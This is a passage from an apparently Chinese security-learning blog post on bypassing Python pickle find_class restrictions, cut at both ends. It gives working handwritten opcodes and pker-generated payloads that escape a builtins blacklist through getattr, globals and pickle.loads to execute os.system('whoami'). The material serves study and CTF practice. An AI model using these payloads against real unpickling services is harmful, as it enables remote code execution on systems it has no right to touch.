<em>来控制要解封的对象。 与其名称所提示的不同，<a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.Unpickler.find_class"><code>Unpickler.find_class()</code></a> 会在执行对任何全局对象（例如一个类或一个函数）的请求时被调用。 因此可以完全禁止全局对象或是将它们限制在一个安全的子集中。</em></p></blockquote><p>在opcode中，<code>c</code>、<code>i</code>、<code>\x93</code>这三个字节码与全局对象有关，当出现这三个字节码时会调用<code>find_class</code>，当我们使用这三个字节码时不违反其限制即可。</p><h4 id="绕过builtins"><a href="#绕过builtins" class="headerlink" title="绕过builtins"></a>绕过builtins</h4><p>在一些例子中，我们常常会见到<code>module==&quot;builtins&quot;</code>这一限制，比如官方文档中的例子，只允许我们导入<code>builtins</code>这一模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br></pre></td></tr></table></figure><p>那么什么是<code>builtins</code>模块呢？</p><p>当我们启动Python之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用</p><p>这类函数被我们称为”内置函数”，这其实就是builtins模块的功劳，这些内置函数都是包含在builtins模块内的。而Python解释器在启动时已经自动帮我们导入了builtins模块，所以我们自然就可以使用这些内置函数了。</p><p>我们可以通过<code>for i in sys.modules[&#39;builtins&#39;].__dict__:print(i)</code>来查看该模块中包含的所有模块函数等，大致如下</p><p><img src="https://bu.dusays.com/2024/05/13/6641a5987cec8.png" alt="image-20240320224132308"></p><p>可以看到有不少命令执行函数，可以直接使用</p><p>假如内置函数中一些执行命令的函数也被禁用了，而我们仍想命令执行，那么漏洞的利用思路就类似于Python中的沙箱逃逸。</p><p>我们来看下面一个例子，这是code-breaking 2018 picklecode中的一个例子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>代码使用了<code>Unpickler.find_class()</code>限制了使用的模块只能为<code>builtins</code>，并且禁用了内置的危险函数，这时我们应该怎么利用呢</p><h5 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h5><p>我们可以借鉴Python沙箱逃逸的思路，获取我们想要的函数。代码没有禁用<code>getattr()</code>函数，<code>getattr</code>可以获取对象的属性值。因此我们可以通过<code>builtins.getattr(builtins,&#39;eval&#39;)</code>的形式来获取eval函数</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597de84e.png" alt="image-20240320224500164"></p><p>接下来我们得构造出一个<code>builtins</code>模块来传给<code>getattr</code>的第一个参数，我们可以使用<code>builtins.globals()</code>函数获取builtins模块包含的内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="built_in">print</span>(builtins.<span class="built_in">globals</span>())</span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;builtins&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;&#125;</span></span><br></pre></td></tr></table></figure><p>从中我们可以看出builtins模块中仍包含builtins模块。由于返回的结果是个字典，所以我们还需要获取get()函数</p><p>由此最终构造的payload为<code>builtins.getattr(builtins.getattr(builtins.dict,&#39;get&#39;)(builtins.golbals(),&#39;builtins&#39;),&#39;eval&#39;)(command)</code></p><p>思路有了，下面就是手写opcode了。首先获取get函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode))</span><br><span class="line"> </span><br><span class="line"><span class="comment">###结果如下</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;builtins getattr&#x27;</span></span><br><span class="line">   <span class="number">18</span>: (    MARK</span><br><span class="line">   <span class="number">19</span>: c        GLOBAL     <span class="string">&#x27;builtins dict&#x27;</span></span><br><span class="line">   <span class="number">34</span>: S        STRING     <span class="string">&#x27;get&#x27;</span></span><br><span class="line">   <span class="number">41</span>: t        TUPLE      (MARK at <span class="number">18</span>)</span><br><span class="line">   <span class="number">42</span>: R    REDUCE</span><br><span class="line">   <span class="number">43</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br><span class="line">&lt;method <span class="string">&#x27;get&#x27;</span> of <span class="string">&#x27;dict&#x27;</span> objects&gt;</span><br></pre></td></tr></table></figure><p>然后获取globals()字典</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">opcode2=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)R.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">pickletools.dis(opcode2)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode2))</span><br><span class="line"> </span><br><span class="line"><span class="comment">###结果如下</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;builtins globals&#x27;</span></span><br><span class="line">   <span class="number">18</span>: )    EMPTY_TUPLE</span><br><span class="line">   <span class="number">19</span>: R    REDUCE</span><br><span class="line">   <span class="number">20</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x000001EF06A308B0</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;C:/Users/34946/Desktop/安全学习/Pickle_Learning/Pickle_builtins1.py&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;pickle&#x27;</span>: &lt;module <span class="string">&#x27;pickle&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickle.py&#x27;</span>&gt;, <span class="string">&#x27;pickletools&#x27;</span>: &lt;module <span class="string">&#x27;pickletools&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickletools.py&#x27;</span>&gt;, <span class="string">&#x27;opcode1&#x27;</span>: <span class="string">b&quot;cbuiltins\ngetattr\n(cbuiltins\ndict\nS&#x27;get&#x27;\ntR.\n&quot;</span>, <span class="string">&#x27;opcode2&#x27;</span>: <span class="string">b&#x27;cbuiltins\nglobals\n)R.\n&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>现在我们有了get()，有了globals()字典，把他们组合起来我们就能够获取builtins模块了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">opcode3=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)RS&#x27;__builtins__&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#以上opcode相当于执行了builtins.getattr(builtins.dict,&#x27;get&#x27;)(builtins.globals(),&#x27;builtins&#x27;)</span></span><br><span class="line"> </span><br><span class="line">pickletools.dis(opcode3)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode3))</span><br><span class="line"> </span><br><span class="line"><span class="comment">###结果如下</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;builtins getattr&#x27;</span></span><br><span class="line">   <span class="number">18</span>: (    MARK</span><br><span class="line">   <span class="number">19</span>: c        GLOBAL     <span class="string">&#x27;builtins dict&#x27;</span></span><br><span class="line">   <span class="number">34</span>: S        STRING     <span class="string">&#x27;get&#x27;</span></span><br><span class="line">   <span class="number">41</span>: t        TUPLE      (MARK at <span class="number">18</span>)</span><br><span class="line">   <span class="number">42</span>: R    REDUCE</span><br><span class="line">   <span class="number">43</span>: (    MARK</span><br><span class="line">   <span class="number">44</span>: c        GLOBAL     <span class="string">&#x27;builtins globals&#x27;</span></span><br><span class="line">   <span class="number">62</span>: (        MARK</span><br><span class="line">   <span class="number">63</span>: t            TUPLE      (MARK at <span class="number">62</span>)</span><br><span class="line">   <span class="number">64</span>: R        REDUCE</span><br><span class="line">   <span class="number">65</span>: S        STRING     <span class="string">&#x27;builtins&#x27;</span></span><br><span class="line">   <span class="number">77</span>: t        TUPLE      (MARK at <span class="number">43</span>)</span><br><span class="line">   <span class="number">78</span>: R    REDUCE</span><br><span class="line">   <span class="number">79</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>最后我们再调用获取到的builtins的eval函数即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)RS&#x27;__builtins__&#x27;</span></span><br><span class="line"><span class="string">tRS&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">restricted_loads(opcode)</span><br><span class="line"> <span class="comment">#&lt;built-in function eval&gt;</span></span><br></pre></td></tr></table></figure><p>最终 我们构造命令执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)RS&#x27;__builtins__&#x27;</span></span><br><span class="line"><span class="string">tRS&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">restricted_loads(opcode)</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然，以上payload只是一种方法，Python沙箱逃逸的方法还有很多，但思想都大同小异。当我们在在绕过<code>find_class</code>时，我们最好先构造出沙箱逃逸的payload，然后再根据payload构造opcode即可。</p><p>当然，如果不想手写opcode的话，也可以使用pker工具来辅助生成opcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload.py</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#获取getattr函数</span></span><br><span class="line"><span class="built_in">getattr</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="comment">#获取字典的get方法</span></span><br><span class="line">get = <span class="built_in">getattr</span>(GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>), <span class="string">&#x27;get&#x27;</span>)</span><br><span class="line"><span class="comment">#获取globals方法</span></span><br><span class="line">golbals=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>)</span><br><span class="line"><span class="comment">#获取字典</span></span><br><span class="line">builtins_dict=golbals()</span><br><span class="line"><span class="comment">#获取builtins模块</span></span><br><span class="line">__builtins__ = get(builtins_dict, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="comment">#获取eval函数</span></span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">getattr</span>(__builtins__,<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 pker.py &lt; pker_test.py</span><br><span class="line"><span class="string">b&quot;cbuiltins\ngetattr\np0\n0g0\n(cbuiltins\ndict\nS&#x27;get&#x27;\ntRp1\n0cbuiltins\nglobals\np2\n0g2\n(tRp3\n0g1\n(g3\nS&#x27;__builtins__&#x27;\ntRp4\n0g0\n(g4\nS&#x27;eval&#x27;\ntRp5\n0g5\n(S&#x27;__import__(\\&#x27;os\\&#x27;).system(\\&#x27;whoami\\&#x27;)&#x27;\ntR.&quot;</span></span><br></pre></td></tr></table></figure><h5 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h5><p>在法1中，我们通过<code>getattr(builtins,&#39;eval&#39;)</code>来获取到了内置函数<code>eval()</code>，getattr的第一个参数——builtins模块，是通过获取<code>globals()</code>中的全局变量得到的。也就是说，<code>globals()</code>函数中含有Python中提前设置好的全局变量，包括我们import的各种模块，那么我们是否可以通过<code>globals(</code>)函数来获取pickle模块呢？我们实验一下便知</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="built_in">print</span>(builtins.<span class="built_in">globals</span>())</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">&#123;..., <span class="string">&#x27;pickle&#x27;</span>: &lt;module <span class="string">&#x27;pickle&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;C:\\...\\Python\\Python38\\lib\\pickle.py&#x27;</span>&gt;, <span class="string">&#x27;secret&#x27;</span>: &lt;module <span class="string">&#x27;secret&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;C:\\...\\Pickle_Learning\\secret.py&#x27;</span>&gt;, <span class="string">&#x27;builtins&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;&#125;</span><br></pre></td></tr></table></figure><p>可以看到，<code>globals()</code>函数中的全局变量，确实包含我们导入的官方或自定义的模块，那么我们就可以尝试导入使用<code>pickle.loads()</code>来绕过<code>find_class()</code>了。</p><p>不过值得注意的是，由于<code>pickle.loads()</code>的参数需要为<code>byte</code>类型。而在<code>Protocol 0</code>中，对于byte类型并没有很好的支持，需要额外导入encode()函数，可能会导致无法绕过<code>find_class</code>限制。</p><p>Protocol 0:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">b=<span class="string">b&#x27;abcdef&#x27;</span></span><br><span class="line">opcode=pickle.dumps(b,protocol=<span class="number">0</span>)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br><span class="line">   <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;_codecs encode&#x27;</span></span><br><span class="line">   <span class="number">16</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: (    MARK</span><br><span class="line">   <span class="number">20</span>: V        UNICODE    <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line">   <span class="number">28</span>: p        PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">31</span>: V        UNICODE    <span class="string">&#x27;latin1&#x27;</span></span><br><span class="line">   <span class="number">39</span>: p        PUT        <span class="number">2</span></span><br><span class="line">   <span class="number">42</span>: t        TUPLE      (MARK at <span class="number">19</span>)</span><br><span class="line">   <span class="number">43</span>: p    PUT        <span class="number">3</span></span><br><span class="line">   <span class="number">46</span>: R    REDUCE</span><br><span class="line">   <span class="number">47</span>: p    PUT        <span class="number">4</span></span><br><span class="line">   <span class="number">50</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>直到<code>Protocol 3</code>版本，Python才引入了<code>B</code>和<code>C</code>两个字节码来标识byte类型</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"> </span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">b=<span class="string">b&#x27;abcdef&#x27;</span></span><br><span class="line">opcode=pickle.dumps(b,protocol=<span class="number">0</span>)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: C    SHORT_BINBYTES <span class="string">b&#x27;abcdef&#x27;</span></span><br><span class="line">   <span class="number">10</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">12</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>可以看到此时pickle对于<code>byte</code>类型变量的支持精简了很多。所以当我们想利用<code>pickle.loads()</code>来绕过find_class时，最好选择<code>Protocol 3</code>版本的opcode构造。</p><p>构造<code>Protocol 3</code>版本的Payload:</p><p>首先获取get函数:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Op</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">getattr</span>,(builtins.<span class="built_in">dict</span>,<span class="string">&#x27;get&#x27;</span>,))</span><br><span class="line"> </span><br><span class="line">op=Op()</span><br><span class="line">opcode=pickle.dumps(op,protocol=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="string">b&#x27;\x80\x03cbuiltins\ngetattr\nq\x00cbuiltins\ndict\nq\x01X\x03\x00\x00\x00getq\x02\x86q\x03Rq\x04.&#x27;</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;builtins getattr&#x27;</span></span><br><span class="line">   <span class="number">20</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">22</span>: c    GLOBAL     <span class="string">&#x27;builtins dict&#x27;</span></span><br><span class="line">   <span class="number">37</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">39</span>: X    BINUNICODE <span class="string">&#x27;get&#x27;</span></span><br><span class="line">   <span class="number">47</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">49</span>: \x86 TUPLE2</span><br><span class="line">   <span class="number">50</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">52</span>: R    REDUCE</span><br><span class="line">   <span class="number">53</span>: q    BINPUT     <span class="number">4</span></span><br><span class="line">   <span class="number">55</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>其中有很多<code>q\0xn</code>字节码，<code>q\xnn</code>这样的序列表示对之前保存的对象的一个引用,去掉也是可以的</p><p>构造出pickle.loads()函数:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntR.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode))</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function loads&gt;</span><br></pre></td></tr></table></figure><p>接着我们生成要执行的Payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command=<span class="string">&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">op=Command()</span><br><span class="line">opcode=pickle.dumps(op,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="string">b&#x27;cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span></span><br></pre></td></tr></table></figure><p>由于loads()函数接受的是byte类型参数，为了方便构造，我们先手动看一下<code>pickle.loads(payload)</code>的字节码，方便我们后续构造:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">bin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (pickle.loads,(<span class="string">b&#x27;&#x27;&#x27;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&#x27;&#x27;&#x27;</span>,))</span><br><span class="line"> </span><br><span class="line">b=<span class="built_in">bin</span>()</span><br><span class="line"><span class="comment"># b=b&#x27;abcdef&#x27;</span></span><br><span class="line">opcode=pickle.dumps(b,protocol=<span 